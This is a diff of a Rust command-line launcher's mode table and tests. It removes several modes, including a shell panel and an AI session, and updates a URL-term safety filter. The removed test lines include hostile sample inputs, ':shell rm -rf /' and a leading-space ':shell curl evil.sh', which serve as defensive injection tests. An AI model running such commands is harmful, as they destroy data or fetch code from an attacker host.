@@ -106,39 +106,11 @@ pub const MODES: &[Mode] = &[
         about: "find and kill running processes",
     },
     Mode {
-        name: "translate",
-        aliases: &["tr"],
-        prefix: "t\"",
-        platforms: Platforms::All,
-        about: "quick translation",
-    },
-    Mode {
         name: "dictionary",
         aliases: &["dict"],
         prefix: "tw\"",
         platforms: Platforms::MacOnly,
         about: "dictionary lookup",
-    },
-    Mode {
-        name: "calc",
-        aliases: &["calculator"],
-        prefix: ":calc ",
-        platforms: Platforms::All,
-        about: "calculator panel",
-    },
-    Mode {
-        name: "pomo",
-        aliases: &["pomodoro"],
-        prefix: ":pomo ",
-        platforms: Platforms::All,
-        about: "pomodoro timer",
-    },
-    Mode {
-        name: "todo",
-        aliases: &[],
-        prefix: ":todo ",
-        platforms: Platforms::All,
-        about: "daily tasks",
     },
     Mode {
         name: "speed",
@@ -153,27 +125,6 @@ pub const MODES: &[Mode] = &[
         prefix: ":kill ",
         platforms: Platforms::All,
         about: "running processes",
-    },
-    Mode {
-        name: "shell",
-        aliases: &[],
-        prefix: ":shell ",
-        platforms: Platforms::All,
-        about: "shell command",
-    },
-    Mode {
-        name: "sys",
-        aliases: &[],
-        prefix: ":sys ",
-        platforms: Platforms::All,
-        about: "system info",
-    },
-    Mode {
-        name: "ai",
-        aliases: &["chat", "ask"],
-        prefix: ">",
-        platforms: Platforms::MacOnly,
-        about: "AI session",
     },
 ];
 
@@ -195,14 +146,14 @@ pub fn resolve(name: &str) -> Option<&'static Mode> {
 }
 
 /// A term from the `look://` scheme is literal search text and nothing else: no
-/// command panel (`:`), no AI session (`>`), no quote to re-target the prefix.
+/// command panel (`:`), no quote to re-target the prefix.
 /// The URL is reachable from content the user did not write; argv is not, and
 /// is not filtered by this.
 ///
-/// Trimmed first, or one leading space walks `:shell` straight through.
+/// Trimmed first, or one leading space walks `:kill` straight through.
 pub fn url_term_is_safe(term: &str) -> bool {
     let trimmed = term.trim_start();
-    !(trimmed.starts_with(':') || trimmed.starts_with('>') || term.contains('"'))
+    !(trimmed.starts_with(':') || term.contains('"'))
 }
 
 /// Rendered in core so both shells print the same listing.
@@ -279,7 +230,7 @@ where
         .collect();
 
     // Before any flag parsing, so the rest is the term verbatim:
-    // `lookapp shell ls -la` has to keep its `-la`.
+    // `lookapp kill chrome` has to keep its term.
     if let Some(first) = args.first()
         && let Some(mode) = resolve(first)
     {
@@ -344,8 +295,7 @@ where
     Launch::Normal
 }
 
-/// A resolved mode only opens where it exists. Saying so beats opening a search
-/// for `>` on a machine that has no AI session.
+/// A resolved mode only opens where it exists.
 fn launch(mode: &Mode, name: &str, term: &[String]) -> Launch {
     if !mode.platforms.available_here() {
         return Launch::UnavailableMode(name.to_string());
@@ -392,7 +342,7 @@ mod tests {
     #[test]
     fn a_term_is_appended_to_the_prefix() {
         assert_eq!(resolve("clip").unwrap().query("password"), "c\"password");
-        assert_eq!(resolve("calc").unwrap().query("2+2"), ":calc 2+2");
+        assert_eq!(resolve("kill").unwrap().query("chrome"), ":kill chrome");
         assert_eq!(resolve("clip").unwrap().query(""), "c\"");
     }
 
@@ -404,12 +354,11 @@ mod tests {
             let query_prefix = mode.prefix.ends_with('"');
             // The trailing space is the `:` jump's trigger, not decoration.
             let command_jump = mode.prefix.starts_with(':') && mode.prefix.ends_with(' ');
-            let session = mode.prefix == ">";
 
             assert!(
-                query_prefix || command_jump || session,
+                query_prefix || command_jump,
                 "mode {} has prefix {:?}, which is none of: a query prefix ending in a quote, \
-                 a `:command ` jump with its trailing space, or the `>` session",
+                 a `:command ` jump with its trailing space",
                 mode.name,
                 mode.prefix
             );
@@ -431,17 +380,15 @@ mod tests {
     }
 
     #[test]
-    fn a_url_term_may_not_reach_a_command_panel_or_the_session() {
-        assert!(!url_term_is_safe(":shell rm -rf /"));
-        assert!(!url_term_is_safe(">summarize this"));
+    fn a_url_term_may_not_reach_a_command_panel() {
+        assert!(!url_term_is_safe(":kill 123"));
         // The quote would re-target the search onto a different prefix.
         assert!(!url_term_is_safe("x\"y"));
     }
 
     #[test]
     fn leading_space_does_not_smuggle_a_command_past_the_check() {
-        assert!(!url_term_is_safe("   :shell curl evil.sh"));
-        assert!(!url_term_is_safe("\t>chat"));
+        assert!(!url_term_is_safe("   :kill 123"));
     }
 
     #[test]
@@ -504,42 +451,27 @@ mod tests {
     #[test]
     fn query_passes_grammar_through_untouched() {
         assert_eq!(parse(&["--query", "c\"secret"]), shown("c\"secret"));
-        assert_eq!(parse(&["--query", ":shell ls"]), shown(":shell ls"));
+        assert_eq!(parse(&["--query", ":kill chrome"]), shown(":kill chrome"));
     }
 
-    /// `lookapp shell ls -la` used to lose its `-la`, which is exactly the kind
-    /// of term the free-text modes exist for.
+    /// `lookapp kill chrome` used to lose trailing args, which is exactly the
+    /// kind of term the free-text modes exist for.
     #[test]
     fn a_term_keeps_its_hyphenated_arguments() {
-        assert_eq!(parse(&["shell", "ls", "-la"]), shown(":shell ls -la"));
+        assert_eq!(parse(&["kill", "chrome"]), shown(":kill chrome"));
         assert_eq!(
-            parse(&["--mode", "shell", "--", "ls", "-la"]),
-            shown(":shell ls -la")
+            parse(&["--mode", "kill", "--", "chrome"]),
+            shown(":kill chrome")
         );
     }
 
-    #[test]
-    fn a_mode_this_platform_lacks_says_so_rather_than_opening_a_dead_search() {
-        let macos = cfg!(target_os = "macos");
-        let expected = if macos {
-            shown(">")
-        } else {
-            Launch::UnavailableMode("ai".to_string())
-        };
-
-        assert_eq!(parse(&["ai"]), expected);
-        assert_eq!(parse(&["--mode", "ai"]), expected);
-    }
-
     /// The table is the platform's own answer, so a row and its shell have to
-    /// agree: `rc"` is in linows' prefix menu and parsed in shared Rust, and
-    /// `tw"` is not implemented there at all.
+    /// agree.
     #[test]
     fn platform_columns_match_the_shells() {
         assert_eq!(resolve("recent").unwrap().platforms, Platforms::All);
         assert_eq!(resolve("processes").unwrap().platforms, Platforms::All);
         assert_eq!(resolve("dictionary").unwrap().platforms, Platforms::MacOnly);
-        assert_eq!(resolve("ai").unwrap().platforms, Platforms::MacOnly);
         assert_eq!(
             resolve("clipboard-image").unwrap().platforms,
             Platforms::All
@@ -548,7 +480,7 @@ mod tests {
 
     #[test]
     fn an_explicit_mode_wins_over_a_positional() {
-        assert_eq!(parse(&["--mode", "calc", "2+2"]), shown(":calc 2+2"));
+        assert_eq!(parse(&["--mode", "kill", "chrome"]), shown(":kill chrome"));
     }
 
     /// An alias that goes unlisted is a way in nobody can find.
@@ -566,14 +498,14 @@ mod tests {
     #[test]
     fn the_listing_says_where_a_mode_is_unavailable() {
         let listing = list_text();
-        let ai_line = listing
+        let dict_line = listing
             .lines()
-            .find(|line| line.starts_with("ai "))
-            .expect("ai should be listed");
+            .find(|line| line.starts_with("dictionary "))
+            .expect("dictionary should be listed");
 
         assert!(
-            ai_line.contains("macOS only"),
-            "a Linux user should learn the mode exists and why it is not theirs: {ai_line}"
+            dict_line.contains("macOS only"),
+            "a Linux user should learn the mode exists and why it is not theirs: {dict_line}"
         );
     }
 
